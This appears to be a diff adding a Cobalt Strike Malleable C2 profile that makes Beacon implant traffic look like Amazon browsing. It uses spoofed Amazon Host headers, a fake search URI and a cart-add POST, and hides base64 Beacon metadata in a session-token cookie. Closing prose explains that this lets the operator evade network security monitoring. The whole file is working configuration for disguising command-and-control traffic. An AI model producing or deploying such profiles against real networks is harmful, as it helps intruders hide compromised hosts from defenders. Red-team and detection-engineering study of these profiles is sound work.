@@ -1,0 +1,63 @@
+# Amazon browsing traffic profile
+# Author: @harmj0y
+
+set sleeptime "2000";
+set jitter "10";
+set maxdns "2400";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";
+
+http-get {
+  set uri "/s/ref=nb_sb_noss_1/103-1640440-7727020-field-keywords=";
+  client {
+    header "Accept" "*/*";
+    header "Host" "www.amazon.com";
+    metadata {
+      base64;
+      prepend "session-token=";
+      prepend "skin=noskin;";
+      append "csm-hit=s-EXAMPLE|EXAMPLE";
+      header "Cookie";
+    }
+  }
+  server {
+    header "Content-Type" "text/html";
+    header "Connection" "close";
+    output {
+      base64;
+    }
+  }
+}
+
+http-post {
+  set uri "/gp/aws/cart/add.html";
+  client {
+    header "Accept" "*/*";
+    header "Content-Type" "application/x-www-form-urlencoded";
+    header "Host" "www.amazon.com";
+    metadata {
+      base64;
+      prepend "session-token=";
+      prepend "skin=noskin;";
+      append "csm-hit=s-EXAMPLE|EXAMPLE";
+      header "Cookie";
+    }
+    parameter "ASIN.1" "B01MQEDEEW";
+    parameter "Quantity.1" "1";
+  }
+  server {
+    header "Content-Type" "text/html";
+    header "Connection" "close";
+    output {
+      base64;
+    }
+  }
+}
+
+
+
+
+
+
+This Malleable C2 profile is designed to mimic the network traffic of an Amazon browsing session. It sets various parameters like the sleep time, jitter, and maximum DNS requests to make the Beacon traffic blend in with normal web browsing activity.
+The http-get and http-post blocks define how the Beacon payload will communicate with the command and control (C2) server. The uri parameter specifies the URL path, the client block defines the headers and parameters to include in the request, and the server block specifies how the response should be handled.
+By customizing these settings, the operator can make the Beacon traffic appear as innocuous Amazon browsing activity, helping it evade detection by network security monitoring tools. This is a key benefit of using Malleable C2 profiles in the Cobalt Strike framework.
